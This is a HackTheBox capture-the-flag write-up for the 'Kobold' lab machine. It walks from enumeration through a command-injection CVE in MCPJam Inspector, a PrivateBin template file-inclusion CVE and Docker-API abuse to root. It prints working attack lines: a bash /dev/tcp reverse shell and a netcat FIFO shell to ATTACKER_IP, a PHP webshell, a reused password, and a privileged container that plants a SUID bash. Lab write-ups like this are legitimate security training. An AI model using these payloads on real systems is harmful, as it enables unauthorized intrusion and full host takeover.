HackTheBox: Kobold Write-up
Enumeration
I started with a full TCP scan against the target:
nmap -p- -sSVC -A -Pn <TARGET_IP>
The scan showed SSH, HTTP/HTTPS, and an additional web service on port 3552:
22/tcp   open  ssh       OpenSSH 9.6p1 Ubuntu
80/tcp   open  http      nginx 1.24.0 (Ubuntu)
443/tcp  open  ssl/http  nginx 1.24.0 (Ubuntu)
3552/tcp open  http      Go net/http server
The TLS certificate covers kobold.htb and *.kobold.htb, so I added the main hostname and target IP to /etc/hosts and enumerated virtual hosts over HTTPS:
ffuf -k -u https://kobold.htb \
  -H 'Host: FUZZ.kobold.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -ac
This revealed two useful subdomains:
<TARGET_IP> kobold.htb mcp.kobold.htb bin.kobold.htb
mcp.kobold.htb runs MCPJam Inspector, bin.kobold.htb runs PrivateBin, and the service on port 3552 is the Arcane Docker management panel.
Initial Foothold: MCPJam Inspector
MCPJam Inspector is vulnerable to unauthenticated command execution through /api/mcp/connect. The instance is reported as version 1.4.2, affected by CVE-2026-23744.
I started a listener, then sent a request that launches a reverse shell as ben:
nc -lvnp 443
curl -k -s -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H 'Content-Type: application/json' \
  --data '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1"],"env":{}},"serverId":"shell"}'
The API may report that the MCP connection failed or closed; the command can still have executed and the reverse shell may arrive at the listener. I confirmed the access and retrieved the user flag:
id
cat /home/ben/user.txt
The flag value is intentionally omitted.
Privilege Escalation: PrivateBin Template LFI
The ben account is a member of the operator group and can write to /privatebin-data/data, a directory mounted into the PrivateBin container. PrivateBin's template-selection feature is enabled, and the installed release is vulnerable to CVE-2025-64714: the template cookie can be used to include a relative PHP path.
I wrote a small PHP webshell into the writable data directory:
echo '<?php system($_REQUEST["cmd"]); ?>' > /privatebin-data/data/shell.php
I confirmed execution through the template cookie:
curl -k -G 'https://bin.kobold.htb/' \
  -H 'Cookie: template=../data/shell' \
  --data-urlencode 'cmd=id'
The command runs inside the PrivateBin container as nobody. To get an interactive shell, I started a listener and used the same webshell to launch a FIFO-based reverse shell:
nc -lvnp 4444
curl -k -G 'https://bin.kobold.htb/' \
  -H 'Cookie: template=../data/shell' \
  --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f'
Inside the container, /srv/cfg/conf.php contains database credentials. The password is reused by the Arcane administrator account:
usr = "privatebin"
pwd = "ComplexP@sswordAdmin1928"
Root Ownership: Arcane and Docker
I authenticated to the Arcane service on port 3552 as arcane. The login API returns a bearer token:
TOKEN=$(curl -s -X POST http://kobold.htb:3552/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"arcane","password":"ComplexP@sswordAdmin1928"}' \
  | jq -r '.data.token')
Using the Arcane API, I created a privileged container with the host filesystem mounted at /host. The container copies bash to the host's /tmp directory and sets the SUID bit:
curl -s -X POST http://kobold.htb:3552/api/environments/0/containers \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{
    "name": "pwn",
    "image": "mysql:latest",
    "hostConfig": {
      "binds": ["/:/host"],
      "privileged": true
    },
    "cmd": ["sh", "-c", "cp /bin/bash /host/tmp/rootbash && chmod 4755 /host/tmp/rootbash"]
  }'
Back in the shell as ben, I executed the SUID copy to get a root shell and read the root flag:
/tmp/rootbash -p
cat /root/root.txt
The root flag value is intentionally omitted.
Alternative Privilege Escalation (Unintended Shortcut)
Some public reproductions report that ben can activate Docker group membership with newgrp docker, even though it is not shown in the normal group listing. If this works on the target instance, it provides a much shorter route to host root by mounting / in a root container:
newgrp docker
docker run --rm -it -u 0 --entrypoint sh \
  -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2
chroot /mnt sh
cat /root/root.txt
This shortcut bypasses the PrivateBin-to-Arcane chain above and is best treated as an unintended configuration issue, rather than the main walkthrough.
